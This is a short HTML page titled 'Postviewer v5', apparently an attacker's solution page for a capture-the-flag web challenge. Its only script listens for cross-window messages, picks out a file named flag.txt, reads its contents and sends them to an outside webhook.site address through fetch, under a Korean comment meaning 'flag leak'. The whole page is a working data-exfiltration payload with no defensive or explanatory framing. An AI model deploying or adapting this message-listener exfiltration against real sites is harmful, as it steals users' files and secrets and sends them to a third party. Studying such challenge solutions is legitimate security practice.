<!DOCTYPE html>
<html>
<head>
  <title>Postviewer v5</title>
</head>
<body>
  <h1>Postviewer v5</h1>

  <script>
    window.addEventListener("message", async (e) => {
      try {
        const file = e.data?.files?.find(f => f.name === "flag.txt");
        if (!file) return;

        const text = await file.blob.text();

        // FLAG 유출
        fetch("https://webhook.site/bc0069f7-ef4e-45f7-8cde-017a9e11de19?flag=" + encodeURIComponent(text));
      } catch (err) {
        console.error(err);
      }
    });
  </script>
</body>
</html>
